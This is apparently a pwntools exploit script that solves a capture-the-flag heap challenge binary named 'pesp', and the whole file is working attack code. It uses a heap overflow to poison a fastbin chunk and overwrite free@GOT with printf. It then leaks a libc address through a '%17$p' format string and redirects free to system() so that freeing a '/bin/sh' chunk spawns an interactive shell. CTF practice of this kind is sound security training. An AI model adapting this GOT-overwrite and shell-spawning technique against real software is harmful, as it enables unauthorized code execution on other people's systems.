#coding:utf8
from pwn import *
# from LibcSearcher import *
context(log_level='debug',terminal=["tmux","splitw","-h"])
binary = "./pesp"
libc_binary = "/lib/x86_64-linux-gnu/libc.so.6"

p = process(argv=[binary])
# p = remote("",)

elf = ELF(binary)
libc = ELF(libc_binary)

context.arch = "amd64"

def opt(idx):
    p.sendlineafter("Your choice:",str(idx))

def add(length,content):
    opt(2)
    p.sendlineafter("Please enter the length of servant name:",str(length))
    p.sendafter("Please enter the name of servant:",str(content))

def free(idx):
    opt(4)
    p.sendlineafter("Please enter the index of servant:",str(idx))

def edit(idx,length,content):
    opt(3)
    p.sendlineafter("Please enter the index of servant:",str(idx))
    p.sendlineafter("Please enter the length of servant name:",str(length))
    p.sendlineafter("Please enter the new name of the servnat:",str(content))

def show():
    opt(1)


add(0x50,"a"*0x50) # overflow 0
add(0x50,"a"*0x50) # 1
add(0x50,"a"*0x50) # 2

target = elf.got["free"] - 0x1e

free(2)
free(1)

# index 0

payload = flat([
    "a"*0x50,
    0,0x61,
    target
    ])

edit(0,len(payload),payload)

add(0x50,"a") # 1

# payload = flat([
    # "\xff\xf7\xff\x7f\x00\x00",
    # 0x7ffff7deef10,
    # "\x00\x07\x40\x00\x00"
# ])
# add(0x50,payload) # free@got -> printf@plt index 4
add(0x50,"a") #2
payload = flat([
    "\xff\xf7\xff\x7f\x00\x00",
    0x7ffff7deef10,
    "\x00\x07\x40\x00\x00"
])
edit(2,len(payload),payload)

payload = "%17$p"
edit(0,len(payload),payload)
free(0)

offset = 0x20840
libc_base = int(p.recv(14),16) - offset
system_addr = libc_base + libc.sym["system"]
log.success("system address is -> "+ hex(system_addr))


payload = flat([
    "\xff\xf7\xff\x7f\x00\x00",
    0x7ffff7deef10,
    p64(system_addr)[:6]
    ])
edit(2,len(payload),payload)

payload = "/bin/sh\x00"
edit(1,len(payload),payload)
free(1)

# gdb.attach(p,"set $h=0x603020,$g=0x6020C0")
p.interactive()
